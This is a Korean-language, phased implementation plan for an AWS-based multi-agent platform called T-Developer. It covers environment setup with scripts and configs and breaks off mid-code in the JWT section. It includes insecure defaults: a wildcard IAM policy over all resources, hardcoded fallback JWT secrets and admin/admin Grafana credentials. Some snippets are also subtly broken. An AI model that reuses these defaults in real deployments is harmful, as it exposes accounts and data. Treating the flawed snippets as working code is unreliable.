# T-Developer 완전 구현을 위한 3단계 세분화 작업 문서

## 📌 전체 구조 개요

```
총 10개 Phase
├── Phase 0: 사전 준비 및 환경 설정 (15 Tasks)
├── Phase 1: 코어 인프라 구축 (20 Tasks)
├── Phase 2: 데이터 레이어 구현 (15 Tasks)
├── Phase 3: 에이전트 프레임워크 구축 (20 Tasks)
├── Phase 4: 9개 핵심 에이전트 구현 (90 Tasks)
├── Phase 5: 오케스트레이션 시스템 (15 Tasks)
├── Phase 6: API 레이어 구현 (25 Tasks)
├── Phase 7: 프론트엔드 구현 (30 Tasks)
├── Phase 8: 통합 및 테스트 (20 Tasks)
└── Phase 9: 배포 및 운영 (15 Tasks)

총 예상 작업: 265 Tasks × 평균 4 SubTasks = 약 1,060개 작업 단위
```

---

# 📋 Phase 0: 사전 준비 및 환경 설정

## Task 0.1: 개발 환경 초기 설정

### SubTask 0.1.1: 필수 도구 설치 확인
**목표**: 개발에 필요한 모든 도구가 설치되어 있는지 확인

**구현 내용**:
```bash
#!/bin/bash
# check-requirements.sh

echo "🔍 개발 환경 체크 시작..."

# Node.js 버전 확인
NODE_VERSION=$(node -v)
if [[ ! "$NODE_VERSION" =~ ^v18\.|^v20\. ]]; then
    echo "❌ Node.js 18+ 필요 (현재: $NODE_VERSION)"
    exit 1
fi

# Python 버전 확인
PYTHON_VERSION=$(python3 --version)
if [[ ! "$PYTHON_VERSION" =~ 3\.(9|10|11) ]]; then
    echo "❌ Python 3.9+ 필요 (현재: $PYTHON_VERSION)"
    exit 1
fi

# AWS CLI 확인
if ! command -v aws &> /dev/null; then
    echo "❌ AWS CLI가 설치되지 않음"
    exit 1
fi

# Docker 확인
if ! command -v docker &> /dev/null; then
    echo "❌ Docker가 설치되지 않음"
    exit 1
fi

echo "✅ 모든 필수 도구가 설치되어 있습니다!"
```

**🔧 사용자 작업**:
- Node.js 18+ 설치
- Python 3.9+ 설치
- AWS CLI v2 설치
- Docker Desktop 설치
- Git 설치

### SubTask 0.1.2: AWS 계정 및 권한 설정
**목표**: AWS 서비스 사용을 위한 계정 설정

**구현 내용**:
```python
# scripts/setup-aws-profile.py
import boto3
import json
import os

def create_iam_policy():
    """T-Developer에 필요한 IAM 정책 생성"""
    policy_document = {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Action": [
                    "bedrock:*",
                    "lambda:*",
                    "dynamodb:*",
                    "s3:*",
                    "cloudwatch:*",
                    "logs:*",
                    "iam:PassRole"
                ],
                "Resource": "*"
            }
        ]
    }
    
    return json.dumps(policy_document)

def setup_aws_profile():
    """AWS 프로필 설정 확인"""
    try:
        sts = boto3.client('sts')
        identity = sts.get_caller_identity()
        print(f"✅ AWS 계정 확인: {identity['Account']}")
        print(f"✅ 사용자 ARN: {identity['Arn']}")
    except Exception as e:
        print(f"❌ AWS 자격 증명 오류: {e}")
        return False
    
    return True

if __name__ == "__main__":
    if setup_aws_profile():
        print("\n📋 필요한 IAM 정책:")
        print(create_iam_policy())
```

**🔧 사용자 작업**:


### SubTask 0.1.3: 프로젝트 저장소 초기화
**목표**: Git 저장소 및 기본 구조 생성

**구현 내용**:
```bash
#!/bin/bash
# init-repository.sh

# 프로젝트 루트 생성
mkdir -p T-DeveloperMVP
cd T-DeveloperMVP

# Git 초기화
git init

# 기본 .gitignore 생성
cat > .gitignore << EOF
# Dependencies
node_modules/
.pnp
.pnp.js

# Testing
coverage/
*.lcov
.nyc_output

# Production
build/
dist/
*.log

# Environment
.env
.env.local
.env.*.local

# AWS
.aws/
*.pem

# IDE
.vscode/
.idea/
*.swp
*.swo
*~

# OS
.DS_Store
Thumbs.db

# Python
__pycache__/
*.py[cod]
*$py.class
.Python
venv/
ENV/

# Terraform
*.tfstate
*.tfstate.*
.terraform/
EOF

# 기본 README 생성
cat > README.md << EOF
# T-Developer

AI-powered multi-agent development platform.

## 🚀 Getting Started

### Prerequisites
- Node.js 18+
- Python 3.9+
- AWS Account
- Docker

### Installation
\`\`\`bash
# Clone repository
git clone https://github.com/your-org/t-developer.git

# Install dependencies
npm install
\`\`\`

## 📚 Documentation
- [Architecture](./docs/architecture.md)
- [API Reference](./docs/api.md)
- [Agent Guide](./docs/agents.md)
EOF

git add .
git commit -m "Initial commit: Project setup"

echo "✅ 저장소 초기화 완료!"
```

**🔧 사용자 작업**:
- GitHub/GitLab 저장소 생성
- 원격 저장소 연결
- 초기 커밋 푸시

### SubTask 0.1.4: 환경 변수 템플릿 생성
**목표**: 필요한 모든 환경 변수 템플릿 파일 생성

**구현 내용**:
```typescript
// scripts/create-env-template.ts
import fs from 'fs';
import path from 'path';

const envTemplate = `# T-Developer Environment Configuration

# Node Environment
NODE_ENV=development
PORT=3000
LOG_LEVEL=debug

# AWS Configuration
AWS_ACCESS_KEY_ID=your-access-key-here
AWS_SECRET_ACCESS_KEY=your-secret-key-here
AWS_REGION=us-east-1
AWS_BEDROCK_REGION=us-east-1

# AI Model API Keys
OPENAI_API_KEY=sk-proj-xxxxxxxxxxxxx
ANTHROPIC_API_KEY=sk-ant-xxxxxxxxxxxxx

# Bedrock AgentCore Configuration
BEDROCK_AGENTCORE_RUNTIME_ID=runtime-xxx
BEDROCK_AGENTCORE_GATEWAY_URL=https://xxx.agentcore.amazonaws.com

# Agent Squad Configuration
AGENT_SQUAD_STORAGE=dynamodb
AGENT_SQUAD_TIMEOUT=300

# Database Configuration
DYNAMODB_ENDPOINT=http://localhost:8000
DYNAMODB_REGION=us-east-1

# S3 Configuration
S3_ARTIFACTS_BUCKET=t-developer-artifacts
S3_REGION=us-east-1

# Redis Configuration (for caching)
REDIS_HOST=localhost
REDIS_PORT=6379
REDIS_PASSWORD=

# GitHub Integration
GITHUB_TOKEN=ghp_xxxxxxxxxxxxx
GITHUB_OWNER=your-org
GITHUB_REPO=t-developer

# Monitoring
AGNO_MONITORING_URL=https://agno.com
ENABLE_MONITORING=true

# Security
JWT_SECRET=your-super-secret-jwt-key
ENCRYPTION_KEY=your-32-character-encryption-key

# External Services
NPM_REGISTRY_URL=https://registry.npmjs.org
PYPI_INDEX_URL=https://pypi.org/simple
MAVEN_CENTRAL_URL=https://repo.maven.apache.org/maven2

# Feature Flags
ENABLE_CACHE=true
ENABLE_TELEMETRY=true
MAX_CONCURRENT_AGENTS=50
`;

const envExamplePath = path.join(process.cwd(), '.env.example');
fs.writeFileSync(envExamplePath, envTemplate);

console.log('✅ .env.example 파일 생성 완료!');
console.log('📋 다음 단계:');
console.log('1. .env.example을 .env로 복사');
console.log('2. 실제 값으로 환경 변수 업데이트');
```

**🔧 사용자 작업**:
- `.env.example`을 `.env`로 복사
- 모든 환경 변수 값 입력
- AWS 자격 증명 설정
- API 키 획득 및 설정

### SubTask 0.1.5: 개발 도구 설정 파일 생성
**목표**: VS Code, ESLint, Prettier 등 개발 도구 설정

**구현 내용**:
```json
// .vscode/settings.json
{
  "editor.formatOnSave": true,
  "editor.codeActionsOnSave": {
    "source.fixAll.eslint": true
  },
  "typescript.tsdk": "node_modules/typescript/lib",
  "files.exclude": {
    "**/.git": true,
    "**/.DS_Store": true,
    "**/node_modules": true,
    "**/dist": true,
    "**/build": true
  },
  "search.exclude": {
    "**/node_modules": true,
    "**/dist": true,
    "**/coverage": true
  }
}
```

```javascript
// .eslintrc.js
module.exports = {
  parser: '@typescript-eslint/parser',
  parserOptions: {
    project: 'tsconfig.json',
    sourceType: 'module',
  },
  plugins: ['@typescript-eslint', 'import'],
  extends: [
    'eslint:recommended',
    'plugin:@typescript-eslint/recommended',
    'plugin:prettier/recommended',
  ],
  root: true,
  env: {
    node: true,
    jest: true,
  },
  rules: {
    '@typescript-eslint/interface-name-prefix': 'off',
    '@typescript-eslint/explicit-function-return-type': 'off',
    '@typescript-eslint/explicit-module-boundary-types': 'off',
    '@typescript-eslint/no-explicit-any': 'warn',
    'import/order': ['error', {
      'groups': ['builtin', 'external', 'internal', 'parent', 'sibling', 'index'],
      'newlines-between': 'always'
    }]
  },
};
```

```json
// .prettierrc
{
  "singleQuote": true,
  "trailingComma": "all",
  "printWidth": 100,
  "tabWidth": 2,
  "semi": true,
  "bracketSpacing": true,
  "arrowParens": "always",
  "endOfLine": "lf"
}
```

---

## Task 0.2: AWS 리소스 초기 설정

### SubTask 0.2.1: DynamoDB 로컬 설정
**목표**: 개발용 DynamoDB Local 설정

**구현 내용**:
```yaml
# docker-compose.dev.yml
version: '3.8'

services:
  dynamodb-local:
    image: amazon/dynamodb-local:latest
    container_name: t-developer-dynamodb
    ports:
      - "8000:8000"
    command: "-jar DynamoDBLocal.jar -sharedDb -inMemory"
    volumes:
      - "./docker/dynamodb:/home/dynamodblocal/data"
    working_dir: /home/dynamodblocal

  dynamodb-admin:
    image: aaronshaf/dynamodb-admin
    container_name: t-developer-dynamodb-admin
    ports:
      - "8001:8001"
    environment:
      DYNAMO_ENDPOINT: "http://dynamodb-local:8000"
      AWS_REGION: "us-east-1"
      AWS_ACCESS_KEY_ID: "local"
      AWS_SECRET_ACCESS_KEY: "local"
    depends_on:
      - dynamodb-local

  redis:
    image: redis:7-alpine
    container_name: t-developer-redis
    ports:
      - "6379:6379"
    command: redis-server --appendonly yes
    volumes:
      - "./docker/redis:/data"
```

```typescript
// scripts/setup-local-db.ts
import { DynamoDBClient, CreateTableCommand } from '@aws-sdk/client-dynamodb';

const client = new DynamoDBClient({
  endpoint: 'http://localhost:8000',
  region: 'us-east-1',
  credentials: {
    accessKeyId: 'local',
    secretAccessKey: 'local'
  }
});

async function createTables() {
  // Projects 테이블
  const projectsTable = new CreateTableCommand({
    TableName: 'T-Developer-Projects',
    KeySchema: [
      { AttributeName: 'id', KeyType: 'HASH' },
    ],
    AttributeDefinitions: [
      { AttributeName: 'id', AttributeType: 'S' },
      { AttributeName: 'userId', AttributeType: 'S' },
      { AttributeName: 'createdAt', AttributeType: 'S' },
    ],
    GlobalSecondaryIndexes: [
      {
        IndexName: 'UserIdIndex',
        KeySchema: [
          { AttributeName: 'userId', KeyType: 'HASH' },
          { AttributeName: 'createdAt', KeyType: 'RANGE' },
        ],
        Projection: { ProjectionType: 'ALL' },
        ProvisionedThroughput: {
          ReadCapacityUnits: 5,
          WriteCapacityUnits: 5,
        },
      },
    ],
    BillingMode: 'PAY_PER_REQUEST',
  });

  try {
    await client.send(projectsTable);
    console.log('✅ Projects 테이블 생성 완료');
  } catch (error) {
    console.error('❌ Projects 테이블 생성 실패:', error);
  }
}

createTables();
```

**🔧 사용자 작업**:
- Docker Desktop 실행
- `docker-compose -f docker-compose.dev.yml up -d` 실행
- DynamoDB Admin UI 접속 확인 (http://localhost:8001)

### SubTask 0.2.2: S3 버킷 생성 스크립트
**목표**: 필요한 S3 버킷 생성 자동화

**구현 내용**:
```python
# scripts/create-s3-buckets.py
import boto3
import json
from botocore.exceptions import ClientError

def create_bucket_if_not_exists(s3_client, bucket_name, region):
    """S3 버킷이 없으면 생성"""
    try:
        s3_client.head_bucket(Bucket=bucket_name)
        print(f"✅ 버킷이 이미 존재함: {bucket_name}")
    except ClientError as e:
        error_code = e.response['Error']['Code']
        if error_code == '404':
            try:
                if region == 'us-east-1':
                    s3_client.create_bucket(Bucket=bucket_name)
                else:
                    s3_client.create_bucket(
                        Bucket=bucket_name,
                        CreateBucketConfiguration={'LocationConstraint': region}
                    )
                print(f"✅ 버킷 생성 완료: {bucket_name}")
                
                # 버킷 정책 설정
                set_bucket_policy(s3_client, bucket_name)
                
            except ClientError as e:
                print(f"❌ 버킷 생성 실패: {e}")
        else:
            print(f"❌ 버킷 확인 실패: {e}")

def set_bucket_policy(s3_client, bucket_name):
    """버킷 정책 설정"""
    bucket_policy = {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Sid": "AllowCloudFrontAccess",
                "Effect": "Allow",
                "Principal": {
                    "Service": "cloudfront.amazonaws.com"
                },
                "Action": "s3:GetObject",
                "Resource": f"arn:aws:s3:::{bucket_name}/*"
            }
        ]
    }
    
    s3_client.put_bucket_policy(
        Bucket=bucket_name,
        Policy=json.dumps(bucket_policy)
    )

def main():
    region = 'us-east-1'
    s3_client = boto3.client('s3', region_name=region)
    
    buckets = [
        't-developer-artifacts',
        't-developer-components',
        't-developer-templates',
        't-developer-backups'
    ]
    
    for bucket in buckets:
        create_bucket_if_not_exists(s3_client, bucket, region)

if __name__ == "__main__":
    main()
```

**🔧 사용자 작업**:
- AWS 콘솔에서 S3 서비스 접근 확인
- 스크립트 실행: `python scripts/create-s3-buckets.py`
- 버킷 생성 확인

### SubTask 0.2.3: Bedrock 모델 액세스 요청
**목표**: AWS Bedrock 모델 사용 권한 획득

**구현 내용**:
```typescript
// scripts/request-bedrock-access.ts
import { BedrockClient, ListFoundationModelsCommand } from '@aws-sdk/client-bedrock';

async function checkBedrockAccess() {
  const client = new BedrockClient({ region: 'us-east-1' });
  
  try {
    const command = new ListFoundationModelsCommand({});
    const response = await client.send(command);
    
    console.log('✅ Bedrock 액세스 확인됨');
    console.log('사용 가능한 모델:');
    
    response.modelSummaries?.forEach(model => {
      console.log(`- ${model.modelId}: ${model.modelName}`);
    });
    
  } catch (error) {
    console.error('❌ Bedrock 액세스 오류:', error);
    console.log('\n📋 Bedrock 모델 액세스 요청 방법:');
    console.log('1. AWS Console > Bedrock 서비스로 이동');
    console.log('2. Model access 메뉴 클릭');
    console.log('3. 다음 모델들에 대해 액세스 요청:');
    console.log('   - Anthropic Claude 3 Sonnet');
    console.log('   - Anthropic Claude 3 Opus');
    console.log('   - Amazon Nova Pro');
    console.log('   - Amazon Nova Lite');
  }
}

checkBedrockAccess();
```

**🔧 사용자 작업**:
- AWS Console에서 Bedrock 서비스 접속
- Model access 메뉴에서 필요한 모델 액세스 요청
- 승인 대기 (보통 즉시 승인)
- 스크립트로 액세스 확인

### SubTask 0.2.4: Lambda 레이어 준비
**목표**: 공통 의존성을 위한 Lambda 레이어 생성

**구현 내용**:
```bash
#!/bin/bash
# scripts/create-lambda-layers.sh

# Node.js 레이어 생성
mkdir -p layers/nodejs-common/nodejs
cd layers/nodejs-common/nodejs

# package.json 생성
cat > package.json << EOF
{
  "name": "t-developer-common-layer",
  "version": "1.0.0",
  "dependencies": {
    "aws-sdk": "^3.0.0",
    "axios": "^1.6.0",
    "lodash": "^4.17.21",
    "uuid": "^9.0.0",
    "joi": "^17.11.0"
  }
}
EOF

npm install --production

cd ..
zip -r nodejs-common-layer.zip nodejs/

# Python 레이어 생성
mkdir -p ../python-common/python
cd ../python-common

cat > requirements.txt << EOF
boto3>=1.26.0
requests>=2.31.0
pandas>=2.0.0
numpy>=1.24.0
EOF

pip install -r requirements.txt -t python/
zip -r python-common-layer.zip python/

echo "✅ Lambda 레이어 생성 완료!"
```

**🔧 사용자 작업**:
- 생성된 ZIP 파일을 AWS Lambda 콘솔에서 레이어로 업로드
- 레이어 ARN 기록

### SubTask 0.2.5: CloudWatch 대시보드 템플릿
**목표**: 모니터링을 위한 CloudWatch 대시보드 설정

**구현 내용**:
```json
// cloudwatch/dashboard-template.json
{
  "widgets": [
    {
      "type": "metric",
      "properties": {
        "metrics": [
          ["T-Developer", "AgentExecutionTime", {"stat": "Average"}],
          [".", ".", {"stat": "Maximum"}],
          [".", "AgentSuccessRate", {"stat": "Average"}]
        ],
        "period": 300,
        "stat": "Average",
        "region": "us-east-1",
        "title": "Agent Performance"
      }
    },
    {
      "type": "metric",
      "properties": {
        "metrics": [
          ["AWS/Lambda", "Invocations", {"stat": "Sum"}],
          [".", "Errors", {"stat": "Sum"}],
          [".", "Duration", {"stat": "Average"}]
        ],
        "period": 300,
        "stat": "Average",
        "region": "us-east-1",
        "title": "Lambda Functions"
      }
    },
    {
      "type": "log",
      "properties": {
        "query": "SOURCE '/aws/lambda/t-developer'\n| fields @timestamp, @message\n| filter @message like /ERROR/\n| sort @timestamp desc\n| limit 20",
        "region": "us-east-1",
        "title": "Recent Errors"
      }
    }
  ]
}
```

**🔧 사용자 작업**:
- CloudWatch 콘솔에서 대시보드 생성
- 템플릿 JSON 임포트
- 알람 설정

---

## Task 0.3: 프로젝트 의존성 설치

### SubTask 0.3.1: 백엔드 의존성 설치
**목표**: Node.js 백엔드 의존성 설치 및 설정

**구현 내용**:
```json
// backend/package.json
{
  "name": "t-developer-backend",
  "version": "1.0.0",
  "description": "T-Developer Backend Services",
  "scripts": {
    "dev": "nodemon",
    "build": "tsc",
    "start": "node dist/main.js",
    "test": "jest",
    "test:watch": "jest --watch",
    "test:coverage": "jest --coverage",
    "lint": "eslint src/**/*.ts",
    "format": "prettier --write src/**/*.ts"
  },
  "dependencies": {
    "@aws-sdk/client-bedrock": "^3.0.0",
    "@aws-sdk/client-bedrock-runtime": "^3.0.0",
    "@aws-sdk/client-dynamodb": "^3.0.0",
    "@aws-sdk/client-lambda": "^3.0.0",
    "@aws-sdk/client-s3": "^3.0.0",
    "@aws-sdk/lib-dynamodb": "^3.0.0",
    "agno": "latest",
    "agent-squad": "latest",
    "express": "^4.18.0",
    "fastapi": "^0.1.0",
    "joi": "^17.11.0",
    "winston": "^3.11.0",
    "bull": "^4.11.0",
    "ioredis": "^5.3.0",
    "jsonwebtoken": "^9.0.0",
    "bcrypt": "^5.1.0",
    "axios": "^1.6.0",
    "lodash": "^4.17.21",
    "uuid": "^9.0.0"
  },
  "devDependencies": {
    "@types/express": "^4.17.0",
    "@types/jest": "^29.5.0",
    "@types/node": "^20.0.0",
    "@typescript-eslint/eslint-plugin": "^6.0.0",
    "@typescript-eslint/parser": "^6.0.0",
    "eslint": "^8.0.0",
    "eslint-config-prettier": "^9.0.0",
    "eslint-plugin-prettier": "^5.0.0",
    "jest": "^29.7.0",
    "nodemon": "^3.0.0",
    "prettier": "^3.0.0",
    "ts-jest": "^29.1.0",
    "ts-node": "^10.9.0",
    "typescript": "^5.0.0"
  }
}
```

```bash
#!/bin/bash
# scripts/install-backend-deps.sh

cd backend
npm install

# Agno 프레임워크 설치 확인
if ! npm list agno > /dev/null 2>&1; then
    echo "⚠️  Agno 설치 확인 필요"
    npm install agno@latest
fi

# Agent Squad 설치 확인
if ! npm list agent-squad > /dev/null 2>&1; then
    echo "⚠️  Agent Squad 설치 확인 필요"
    npm install agent-squad@latest
fi

echo "✅ 백엔드 의존성 설치 완료!"
```

**🔧 사용자 작업**:
- `cd backend && npm install` 실행
- 설치 오류 발생 시 해결

### SubTask 0.3.2: Python 의존성 설치
**목표**: Python 스크립트 및 도구를 위한 의존성 설치

**구현 내용**:
```txt
# requirements.txt
boto3>=1.26.0
botocore>=1.29.0
python-dotenv>=1.0.0
requests>=2.31.0
pydantic>=2.0.0
fastapi>=0.100.0
uvicorn>=0.23.0
pytest>=7.4.0
black>=23.0.0
flake8>=6.0.0
mypy>=1.5.0
```

```python
# scripts/setup-python-env.py
import subprocess
import sys
import venv
import os

def create_virtual_env():
    """Python 가상 환경 생성"""
    venv_path = os.path.join(os.getcwd(), 'venv')
    
    if not os.path.exists(venv_path):
        print("🔧 Python 가상 환경 생성 중...")
        venv.create(venv_path, with_pip=True)
        print("✅ 가상 환경 생성 완료")
    else:
        print("✅ 가상 환경이 이미 존재합니다")
    
    # 활성화 명령 출력
    if sys.platform == "win32":
        activate_cmd = f"{venv_path}\\Scripts\\activate"
    else:
        activate_cmd = f"source {venv_path}/bin/activate"
    
    print(f"\n📋 가상 환경 활성화 명령:")
    print(f"   {activate_cmd}")
    
    return venv_path

def install_dependencies():
    """의존성 설치"""
    subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"])
    subprocess.run([sys.executable, "-m", "pip", "install", "-r", "requirements.txt"])

if __name__ == "__main__":
    create_virtual_env()
    # 주의: 가상 환경 활성화 후 수동으로 설치 필요
```

**🔧 사용자 작업**:
- Python 가상 환경 생성: `python -m venv venv`
- 가상 환경 활성화
- `pip install -r requirements.txt` 실행

### SubTask 0.3.3: 프론트엔드 의존성 준비
**목표**: React 기반 프론트엔드 초기 설정

**구현 내용**:
```json
// frontend/package.json
{
  "name": "t-developer-frontend",
  "version": "1.0.0",
  "private": true,
  "dependencies": {
    "react": "^18.2.0",
    "react-dom": "^18.2.0",
    "react-router-dom": "^6.20.0",
    "@mui/material": "^5.14.0",
    "@emotion/react": "^11.11.0",
    "@emotion/styled": "^11.11.0",
    "axios": "^1.6.0",
    "socket.io-client": "^4.7.0",
    "@tanstack/react-query": "^5.0.0",
    "zustand": "^4.4.0",
    "react-hook-form": "^7.48.0",
    "recharts": "^2.10.0",
    "monaco-editor": "^0.44.0",
    "@monaco-editor/react": "^4.6.0"
  },
  "devDependencies": {
    "@types/react": "^18.2.0",
    "@types/react-dom": "^18.2.0",
    "@vitejs/plugin-react": "^4.2.0",
    "vite": "^5.0.0",
    "typescript": "^5.0.0",
    "@typescript-eslint/eslint-plugin": "^6.0.0",
    "@typescript-eslint/parser": "^6.0.0",
    "eslint": "^8.0.0",
    "eslint-plugin-react": "^7.33.0",
    "eslint-plugin-react-hooks": "^4.6.0"
  },
  "scripts": {
    "dev": "vite",
    "build": "tsc && vite build",
    "preview": "vite preview",
    "lint": "eslint src --ext ts,tsx",
    "type-check": "tsc --noEmit"
  }
}
```

```typescript
// frontend/vite.config.ts
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';
import path from 'path';

export default defineConfig({
  plugins: [react()],
  resolve: {
    alias: {
      '@': path.resolve(__dirname, './src'),
    },
  },
  server: {
    port: 3000,
    proxy: {
      '/api': {
        target: 'http://localhost:8000',
        changeOrigin: true,
      },
      '/ws': {
        target: 'ws://localhost:8000',
        ws: true,
      },
    },
  },
});
```

**🔧 사용자 작업**:
- 프론트엔드 디렉토리 생성 (아직 구현하지 않음)
- 나중에 Phase 7에서 실제 설치 진행

### SubTask 0.3.4: 개발 도구 전역 설치
**목표**: 필요한 전역 개발 도구 설치

**구현 내용**:
```bash
#!/bin/bash
# scripts/install-global-tools.sh

echo "🔧 전역 개발 도구 설치 중..."

# TypeScript
npm install -g typescript

# AWS CDK
npm install -g aws-cdk

# Serverless Framework
npm install -g serverless

# PM2 (프로세스 관리)
npm install -g pm2

# Lerna (모노레포 관리)
npm install -g lerna

echo "✅ 전역 도구 설치 완료!"

# 설치 확인
echo "\n📋 설치된 도구 버전:"
echo "TypeScript: $(tsc --version)"
echo "AWS CDK: $(cdk --version)"
echo "Serverless: $(serverless --version)"
echo "PM2: $(pm2 --version)"
echo "Lerna: $(lerna --version)"
```

**🔧 사용자 작업**:
- 스크립트 실행 권한 부여: `chmod +x scripts/install-global-tools.sh`
- 스크립트 실행: `./scripts/install-global-tools.sh`

### SubTask 0.3.5: 로컬 개발 서버 설정
**목표**: 개발용 로컬 서버 환경 구성

**구현 내용**:
```typescript
// scripts/dev-server.ts
import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import cors from 'cors';

const app = express();
const httpServer = createServer(app);
const io = new Server(httpServer, {
  cors: {
    origin: "http://localhost:3000",
    methods: ["GET", "POST"]
  }
});

// 미들웨어
app.use(cors());
app.use(express.json());

// 헬스 체크
app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    timestamp: new Date().toISOString(),
    services: {
      api: 'running',
      websocket: 'running',
      database: 'pending'
    }
  });
});

// WebSocket 연결
io.on('connection', (socket) => {
  console.log('Client connected:', socket.id);
  
  socket.on('disconnect', () => {
    console.log('Client disconnected:', socket.id);
  });
});

const PORT = process.env.PORT || 8000;
httpServer.listen(PORT, () => {
  console.log(`✅ 개발 서버 실행 중: http://localhost:${PORT}`);
  console.log(`📡 WebSocket 서버 실행 중: ws://localhost:${PORT}`);
});
```

```json
// nodemon.json
{
  "watch": ["src", "scripts"],
  "ext": "ts,js,json",
  "ignore": ["src/**/*.spec.ts", "node_modules"],
  "exec": "ts-node",
  "env": {
    "NODE_ENV": "development"
  }
}
```

**🔧 사용자 작업**:
- 개발 서버 실행: `npm run dev`
- 헬스 체크 확인: http://localhost:8000/health

---

### SubTask 0.3.6: 모니터링 도구 설정
**목표**: 개발 환경 모니터링 도구 설정

**구현 내용**:
```typescript
// backend/src/utils/monitoring.ts
import { StatsD } from 'node-statsd';
import winston from 'winston';
import { CloudWatchTransport } from 'winston-cloudwatch';

// StatsD 클라이언트 (로컬 개발용)
export const metrics = new StatsD({
  host: process.env.STATSD_HOST || 'localhost',
  port: parseInt(process.env.STATSD_PORT || '8125'),
  prefix: 't-developer.',
  mock: process.env.NODE_ENV === 'test'
});

// Winston 로거 설정
export const logger = winston.createLogger({
  level: process.env.LOG_LEVEL || 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.errors({ stack: true }),
    winston.format.splat(),
    winston.format.json()
  ),
  defaultMeta: { service: 't-developer' },
  transports: [
    new winston.transports.Console({
      format: winston.format.combine(
        winston.format.colorize(),
        winston.format.simple()
      )
    }),
    new winston.transports.File({ 
      filename: 'logs/error.log', 
      level: 'error' 
    }),
    new winston.transports.File({ 
      filename: 'logs/combined.log' 
    })
  ]
});

// CloudWatch 전송 (프로덕션)
if (process.env.NODE_ENV === 'production') {
  logger.add(new CloudWatchTransport({
    logGroupName: '/aws/t-developer',
    logStreamName: `${process.env.NODE_ENV}-${new Date().toISOString().split('T')[0]}`,
    awsRegion: process.env.AWS_REGION
  }));
}
```

```yaml
# docker-compose.monitoring.yml
version: '3.8'

services:
  grafana:
    image: grafana/grafana:latest
    container_name: t-developer-grafana
    ports:
      - "3001:3000"
    environment:
      - GF_SECURITY_ADMIN_PASSWORD=admin
    volumes:
      - ./docker/grafana:/var/lib/grafana

  prometheus:
    image: prom/prometheus:latest
    container_name: t-developer-prometheus
    ports:
      - "9090:9090"
    volumes:
      - ./docker/prometheus/prometheus.yml:/etc/prometheus/prometheus.yml
      - ./docker/prometheus/data:/prometheus

  statsd:
    image: graphiteapp/graphite-statsd
    container_name: t-developer-statsd
    ports:
      - "8125:8125/udp"
      - "8126:8126"
      - "2003:2003"
```

**🔧 사용자 작업**:
- `docker-compose -f docker-compose.monitoring.yml up -d` 실행
- Grafana 접속: http://localhost:3001 (admin/admin)
- Prometheus 접속: http://localhost:9090

---

## Task 0.4: 보안 및 인증 기초 설정

### SubTask 0.4.1: 환경 변수 암호화 설정
**목표**: 민감한 정보 보호를 위한 암호화 설정

**구현 내용**:
```typescript
// backend/src/utils/crypto.ts
import crypto from 'crypto';
import fs from 'fs/promises';
import path from 'path';

export class EnvCrypto {
  private algorithm = 'aes-256-gcm';
  private keyPath = path.join(process.cwd(), '.env.key');
  
  async generateKey(): Promise<string> {
    const key = crypto.randomBytes(32).toString('hex');
    await fs.writeFile(this.keyPath, key, { mode: 0o600 });
    console.log('✅ 암호화 키가 생성되었습니다: .env.key');
    console.log('⚠️  이 파일을 안전하게 보관하고 절대 커밋하지 마세요!');
    return key;
  }
  
  async encrypt(text: string): Promise<string> {
    const key = await this.getKey();
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv(this.algorithm, Buffer.from(key, 'hex'), iv);
    
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    const authTag = cipher.getAuthTag();
    
    return iv.toString('hex') + ':' + authTag.toString('hex') + ':' + encrypted;
  }
  
  async decrypt(encryptedText: string): Promise<string> {
    const key = await this.getKey();
    const parts = encryptedText.split(':');
    const iv = Buffer.from(parts[0], 'hex');
    const authTag = Buffer.from(parts[1], 'hex');
    const encrypted = parts[2];
    
    const decipher = crypto.createDecipheriv(this.algorithm, Buffer.from(key, 'hex'), iv);
    decipher.setAuthTag(authTag);
    
    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    
    return decrypted;
  }
  
  private async getKey(): Promise<string> {
    try {
      return await fs.readFile(this.keyPath, 'utf8');
    } catch (error) {
      throw new Error('암호화 키를 찾을 수 없습니다. generateKey()를 먼저 실행하세요.');
    }
  }
}

// 환경 변수 암호화 스크립트
export async function encryptEnvFile(): Promise<void> {
  const crypto = new EnvCrypto();
  const envPath = path.join(process.cwd(), '.env');
  const encryptedPath = path.join(process.cwd(), '.env.encrypted');
  
  const envContent = await fs.readFile(envPath, 'utf8');
  const lines = envContent.split('\n');
  
  const encryptedLines = await Promise.all(lines.map(async (line) => {
    if (line.includes('=') && !line.startsWith('#')) {
      const [key, value] = line.split('=', 2);
      if (key.includes('SECRET') || key.includes('KEY') || key.includes('PASSWORD')) {
        const encrypted = await crypto.encrypt(value);
        return `${key}=ENC:${encrypted}`;
      }
    }
    return line;
  }));
  
  await fs.writeFile(encryptedPath, encryptedLines.join('\n'));
  console.log('✅ 환경 변수가 암호화되었습니다: .env.encrypted');
}
```

**🔧 사용자 작업**:
- 암호화 키 생성: `ts-node scripts/generate-crypto-key.ts`
- `.env.key`를 안전한 곳에 보관
- `.gitignore`에 `.env.key` 추가 확인

### SubTask 0.4.2: JWT 토큰 관리 설정
**목표**: API 인증을 위한 JWT 설정

**구현 내용**:
```typescript
// backend/src/utils/auth.ts
import jwt from 'jsonwebtoken';
import bcrypt from 'bcrypt';
import { promisify } from 'util';

export interface TokenPayload {
  userId: string;
  email: string;
  role: 'user' | 'admin';
}

export class AuthManager {
  private readonly accessTokenSecret: string;
  private readonly refreshTokenSecret: string;
  private readonly accessTokenExpiry = '15m';
  private readonly refreshTokenExpiry = '7d';
  
  constructor() {
    this.accessTokenSecret = process.env.JWT_ACCESS_SECRET || 'dev-access-secret';
    this.refreshTokenSecret = process.env.JWT_REFRESH_SECRET || 'dev-refresh-secret';
    
    if (process.env.NODE_ENV === 'production' && this.accessTokenSecret === 'dev-access-secret') {
      throw new Error('JWT secrets must be set in production');
    }
  }
  
  async generateTokens(payload: TokenPayload): Promise<{
    accessToken: string;
    refreshToken: string;
  }> {
    const accessToken = jwt.sign(payload, this.accessTokenSecret, {
